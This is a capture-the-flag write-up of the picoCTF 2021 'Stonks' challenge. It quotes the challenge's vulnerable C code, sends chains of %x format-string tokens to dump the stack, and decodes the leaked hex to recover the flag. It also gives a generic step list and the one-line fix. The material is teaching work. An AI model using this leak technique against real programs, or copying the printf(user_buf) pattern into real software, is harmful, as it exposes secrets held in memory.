# Challenge Write-Up — Stonks

---

## 📌 Challenge Overview

| Field           | Information                                                                                    |
| :-------------- | :--------------------------------------------------------------------------------------------- |
| **Competition** | picoCTF 2021                                                                                   |
| **Category**    | Binary Exploitation                                                                            |
| **Difficulty**  | Easy                                                                                           |
| **Objective**   | Exploit a format string vulnerability to leak the flag from the stack, then decode the hex output |

---

## Initial Analysis

The program is a fake stock trading app. It lets you buy stonks or view your portfolio. When you choose to buy, it asks for an API token. That token input is where the vulnerability lives.

The challenge description drops a hint: "Okay, maybe I'd believe you if you find my API key." That points us toward the flag being somewhere in memory, not displayed outright.

My plan:
- Read the source code to find the format string vulnerability
- Understand why the flag ends up on the stack in the first place
- Send `%x` tokens to dump stack values
- Decode the hex output in CyberChef to reconstruct the flag

---

## 🔎 Step 1 — Read the Source Code

Inside the `buy_stonks()` function, two things happened back to back that made this exploitable.

First, the flag was read from a file into a local buffer on the stack:

```c
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api", "r");
fgets(api_buf, FLAG_BUFFER, f);
```

Then, a few lines later, the user's API token input was printed with the same `printf(buf)` mistake we have seen in other format string challenges:

```c
char *user_buf = malloc(300 + 1);
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);   // format string vulnerability
```

Because `api_buf` was allocated earlier in the same function, its contents were sitting on the stack when `printf(user_buf)` ran. That meant our format string tokens could walk up the stack and reach it.

---

## Step 2 — Confirm the Vulnerability

I connected to the server, chose option `1` to buy stonks, and typed a single `%x` as the API token:

```
What is your API token?
%x
Buying stonks with token:
8e70430
```

A hex value printed back immediately — confirming the format string vulnerability was real and working.

---

## Step 3 — Dump the Stack

To get enough of the stack to find the flag, I sent a long chain of `%x` tokens separated by dots:

```
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
```

The output looked like this:

```
940c4b0.804b000.80489c3.f7f0ad80.ffffffff.1.940a160.f7f18110.f7f0adc7.0.940b180.1.940c3f0.940c4b0.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.31636637.36313032.ff96007d
```

Most of those values are just memory addresses and junk. But starting around position 15, the pattern changed. The values `6f636970` and `7b465443` stood out because they decode to recognisable ASCII.

`6f636970` reversed (little-endian) = `pico`
`7b465443` reversed = `CTF{`

That told us the flag was in there, just stored in little-endian format.

---

## Step 4 — Decode the Flag in CyberChef

I took the hex values that looked like ASCII, starting from `6f636970` and stopping at the value ending with `7d` (which is `}` in ASCII). I pasted them into CyberChef and applied two operations:

1. **From Hex** — converts each hex block to bytes
2. **Reverse** — flips each 4-byte block to correct the little-endian byte order

The flag appeared after reassembling the blocks in order. ✅

---

## 🏁 Flag

```
picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}
```

---

## 🔬 What Made This Work

Two things combined to make this exploit possible.

First, the flag was read into `api_buf`, a local variable on the stack. Local variables live on the stack, so the flag was sitting right there in memory when the vulnerable `printf` ran.

Second, `printf(user_buf)` treated our input as a format string. Each `%x` token told `printf` to read the next value off the stack and print it as a hex number. By sending enough tokens, we walked up the stack far enough to reach `api_buf` and print every byte of the flag.

The little-endian detail is the same as in previous challenges: x86 stores 4-byte values with the smallest byte first, so the bytes come out reversed. Each 4-byte chunk needs to be flipped to read the text correctly.

Why `%x` and not `%p`? Both work, but `%x` outputs plain hex without the `0x` prefix, which makes the CyberChef decoding step cleaner. Using `%s` would crash the program because it would try to dereference the stack values as string pointers, most of which are not valid addresses.

---

## 🎯 How to Solve Challenges Like This

1. Read the source code and find `printf(buf)` where user input is passed directly
2. Check whether any sensitive data (flag, key, token) is loaded into a local variable in the same function
3. Connect and send a single `%x` to confirm the vulnerability works
4. Send a long chain of `%x.%x.%x...` to dump the stack
5. Look for hex values that decode to recognisable ASCII like `pico` or `CTF{`
6. Copy those values into CyberChef, apply From Hex then Reverse to get the flag

---

## 🧩 Final Thoughts

Stonks is a great example of how a format string vulnerability becomes dangerous when sensitive data is nearby in memory. The `printf(buf)` mistake alone is bad. But the fact that the flag was loaded into a local buffer just a few lines earlier — on the same stack frame — made leaking it almost trivial.

The fix is the same one-word change every format string challenge points to: `printf("%s", user_buf)` instead of `printf(user_buf)`. That one missing argument prevents the user from ever injecting their own format tokens.

---
